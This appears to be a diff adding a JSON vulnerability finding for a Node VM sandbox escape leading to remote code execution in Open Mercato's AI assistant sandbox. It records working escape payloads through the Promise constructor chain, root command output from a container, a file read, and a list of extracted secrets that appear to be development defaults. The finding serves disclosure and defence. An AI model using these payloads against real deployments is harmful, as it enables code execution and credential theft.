@@ -1,0 +1,41 @@
+{
+  "finding": "NEW-01: VM Sandbox Escape → RCE",
+  "reported_against": "Open Mercato v0.4.9",
+  "sandbox_file": "packages/ai-assistant/src/modules/ai_assistant/lib/sandbox.ts",
+  "escape_vector": "Promise.resolve().constructor.constructor('return process.getBuiltinModule(\"child_process\").execSync(cmd).toString()')()",
+  "confirmed_environments": [
+    {
+      "node_version": "v22.22.0",
+      "host": "developer machine",
+      "escape_via": "Promise.resolve().constructor.constructor('return require(\"child_process\")')",
+      "result": "uid=1000(ctown) gid=1000(ctown) groups=...,27(sudo),..."
+    },
+    {
+      "node_version": "v24.14.0",
+      "host": "open-mercato-app-1 container (production runtime)",
+      "escape_via": "Promise.resolve().constructor.constructor('return process.getBuiltinModule(\"child_process\").execSync(\"id\")')",
+      "result": "uid=0(root) gid=0(root) groups=0(root),..."
+    }
+  ],
+  "secrets_extracted": {
+    "DATABASE_URL": "postgres://postgres:postgres@mercato-postgres-local:5432/open-mercato",
+    "JWT_SECRET": "demo-jwt-secret-change-for-prod",
+    "ENCRYPTION_KEY": "dev-tenant-encryption-fallback-key-32chars",
+    "MEILISEARCH_KEY": "meilisearch-dev-key",
+    "REDIS_URL": "redis://mercato-redis-local:6379"
+  },
+  "filesystem_access": {
+    "confirmed": true,
+    "method": "process.getBuiltinModule('fs').readFileSync('/etc/hostname','utf8')",
+    "result": "f53cadbcf9cd (container hostname)"
+  },
+  "note_on_node_versions": [
+    "Node 22: require() accessible via constructor chain — original escape vector",
+    "Node 24: require() NOT accessible (blocked), but process.getBuiltinModule() IS accessible — alternative escape",
+    "Both Node versions confirmed exploitable",
+    "Project uses node:24-alpine in Dockerfile — escape confirmed on actual runtime"
+  ],
+  "opencode_dependency": "Exploit path requires OpenCode deployed (docker-compose.fullapp.yml includes it). Not present in Railway template.",
+  "proof_script": "/tmp/poc_final.cjs (copied to container as /tmp/poc_final.cjs)",
+  "timestamp": "2026-03-28T01:14:55.987Z"
+}
